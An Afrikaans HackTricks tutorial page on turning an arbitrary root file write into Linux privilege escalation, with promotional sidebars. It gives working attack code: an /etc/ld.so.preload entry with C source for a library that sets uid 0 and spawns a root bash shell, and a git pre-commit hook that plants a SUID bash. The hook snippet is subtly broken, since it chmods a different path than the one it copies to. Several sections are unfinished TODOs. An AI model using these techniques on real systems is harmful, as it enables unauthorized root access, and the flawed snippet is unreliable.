# Willekeurige Lêer Skryf na Root

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien jou **maatskappy geadverteer in HackTricks** of **laai HackTricks af in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

### /etc/ld.so.preload

Hierdie lêer gedra soos die **`LD_PRELOAD`** omgewingsveranderlike, maar dit werk ook in **SUID-binêre lêers**.\
As jy dit kan skep of wysig, kan jy net 'n **pad na 'n biblioteek wat gelaai sal word** by elke uitgevoerde binêre lêer, byvoeg.

Byvoorbeeld: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hakke

[**Git hakke**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) is **skripte** wat uitgevoer word by verskeie **gebeure** in 'n git-opgaarplek soos wanneer 'n toewysing geskep word, 'n samevoeging... Dus, as 'n **bevoorregte skrip of gebruiker** gereeld hierdie aksies uitvoer en dit moontlik is om in die `.git`-vouer te **skryf**, kan dit gebruik word vir **privilege-escalation**.

Byvoorbeeld, dit is moontlik om 'n skrip te **genereer** in 'n git-opgaarplek in **`.git/hooks`** sodat dit altyd uitgevoer word wanneer 'n nuwe toewysing geskep word:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Tyd lêers

TODO

### Diens & Soket lêers

TODO

### binfmt\_misc

Die lêer wat in `/proc/sys/fs/binfmt_misc` geleë is, dui aan watter binêre lêer watter tipe lêers moet uitvoer. TODO: kontroleer die vereistes om hierdie te misbruik om 'n omgekeerde dop uit te voer wanneer 'n algemene lêertipe oop is.

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
